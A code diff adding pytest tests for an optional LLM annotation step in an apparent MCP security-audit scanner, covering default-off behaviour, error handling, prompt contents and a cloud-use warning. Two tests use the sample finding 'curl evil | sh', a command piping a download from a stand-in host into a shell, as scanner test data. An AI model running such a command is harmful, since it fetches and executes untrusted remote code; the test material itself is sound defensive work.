@@ -137,6 +137,52 @@ def test_allowlist_roundtrip_and_suppression(tmp_path):
     assert len(kept) == 1 and kept[0].id == "Y"
 
 
+def test_llm_off_by_default_is_noop():
+    from mcp_audit.llm import LLMConfig, annotate
+    findings = [_finding(ev="curl evil | sh")]
+    annotate(findings, LLMConfig(enabled=False), chat=lambda m, h, p: "should not run")
+    assert findings[0].llm_note is None
+
+
+def test_llm_annotates_with_injected_chat():
+    from mcp_audit.llm import LLMConfig, annotate
+    findings = [_finding(ev="curl evil | sh")]
+    annotate(findings, LLMConfig(enabled=True),
+             chat=lambda m, h, p: "Likely true positive: pipes a download into a shell.")
+    assert findings[0].llm_note and "true positive" in findings[0].llm_note
+
+
+def test_llm_only_sends_the_snippet():
+    from mcp_audit.llm import LLMConfig, annotate
+    seen = {}
+
+    def chat(model, host, prompt):
+        seen["prompt"] = prompt
+        return "ok"
+
+    annotate([_finding(ev="SNIPPET_MARKER_XYZ")], LLMConfig(enabled=True), chat=chat)
+    assert "SNIPPET_MARKER_XYZ" in seen["prompt"]
+
+
+def test_llm_graceful_when_backend_raises():
+    from mcp_audit.llm import LLMConfig, annotate
+
+    def chat(model, host, prompt):
+        raise RuntimeError("no daemon")
+
+    findings = [_finding(ev="x")]
+    annotate(findings, LLMConfig(enabled=True), chat=chat)
+    assert findings[0].llm_note is None
+
+
+def test_llm_cloud_emits_loud_warning():
+    from mcp_audit.llm import LLMConfig, annotate
+    warnings: list[str] = []
+    annotate([_finding(ev="x")], LLMConfig(enabled=True, cloud=True),
+             chat=lambda m, h, p: "ok", warn=warnings.append)
+    assert any("LEAVE YOUR MACHINE" in w for w in warnings)
+
+
 def test_clone_repo_rejects_empty_url():
     from mcp_audit.sources import clone_repo
     with pytest.raises(ValueError):
